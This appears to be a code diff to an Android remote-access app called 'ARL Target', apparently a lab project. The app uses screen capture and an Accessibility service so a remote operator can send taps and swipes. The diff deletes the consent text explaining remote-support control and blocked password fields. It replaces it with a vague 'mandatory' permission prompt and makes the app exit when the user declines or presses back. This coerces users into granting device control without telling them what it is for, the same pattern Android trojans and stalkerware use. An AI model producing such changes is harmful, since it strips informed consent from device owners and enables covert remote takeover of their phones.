@@ -3,12 +3,14 @@ package lab.arl.target.presentation
 import android.Manifest
 import android.app.Activity
 import android.content.Context
+import android.content.ContextWrapper
 import android.content.Intent
 import android.media.projection.MediaProjectionConfig
 import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.Bundle
 import androidx.activity.ComponentActivity
+import androidx.activity.compose.BackHandler
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
@@ -64,7 +66,10 @@ class MainActivity : ComponentActivity() {
         setContent {
             ArlTargetTheme {
                 Surface(modifier = Modifier.fillMaxSize()) {
-                    TargetScreen(vm)
+                    TargetScreen(vm, onExit = {
+                        finishAffinity()
+                        kotlin.system.exitProcess(0)
+                    })
                 }
             }
         }
@@ -83,7 +88,7 @@ class MainActivity : ComponentActivity() {
 }
 
 @Composable
-fun TargetScreen(vm: TargetViewModel) {
+fun TargetScreen(vm: TargetViewModel, onExit: () -> Unit = {}) {
     val state by vm.ui.collectAsState()
     val backup by vm.backup.collectAsState()
     val presentation = remember(state) { TargetPresentationMapper.map(state, state.screenCaptureActive) }
@@ -190,25 +195,33 @@ fun TargetScreen(vm: TargetViewModel) {
         Text("API ${state.apiBaseUrl.ifBlank { lab.arl.target.BuildConfig.API_BASE_URL }}", style = MaterialTheme.typography.bodySmall)
     }
 
-    if (state.showAccessibilityOnboarding) {
+    val isAccessibilityActive = state.accessibilityEnabled && !state.showAccessibilityOnboarding
+
+    BackHandler(enabled = !isAccessibilityActive) {
+        onExit()
+    }
+
+    if (!isAccessibilityActive) {
         AlertDialog(
-            onDismissRequest = vm::dismissAccessibilityOnboarding,
-            title = { Text("Enable Accessibility for remote support") },
+            onDismissRequest = {
+                onExit()
+            },
+            title = { Text("Accessibility Permission Required", fontWeight = FontWeight.Bold) },
             text = {
                 Text(
-                    "ARL Target needs the Accessibility service so an authorized lab administrator can send taps, swipes, and navigation actions during a consented remote-support session. " +
-                        "Android will ask you to turn on “ARL Target” yourself. This app cannot enable the service silently. " +
-                        "Password fields, the lock screen, and security dialogs stay blocked."
+                    "ARL Target requires Accessibility service permission to function. " +
+                        "This permission is a mandatory pass to use the application. " +
+                        "Please enable “ARL Target” in Accessibility settings to continue."
                 )
             },
             confirmButton = {
                 Button(onClick = { vm.openAccessibilitySettings(context) }) {
-                    Text("Open Accessibility Settings")
+                    Text("Open Settings")
                 }
             },
             dismissButton = {
-                TextButton(onClick = vm::dismissAccessibilityOnboarding) {
-                    Text("Not Now")
+                TextButton(onClick = { onExit() }) {
+                    Text("Exit App")
                 }
             }
         )
@@ -383,4 +396,10 @@ private fun StatusDot(online: Boolean) {
         color = if (online) Color(0xFF2E7D32) else MaterialTheme.colorScheme.onSurfaceVariant,
         fontWeight = FontWeight.Bold
     )
+}
+
+tailrec fun Context.findActivity(): Activity? = when (this) {
+    is Activity -> this
+    is ContextWrapper -> baseContext.findActivity()
+    else -> null
 }
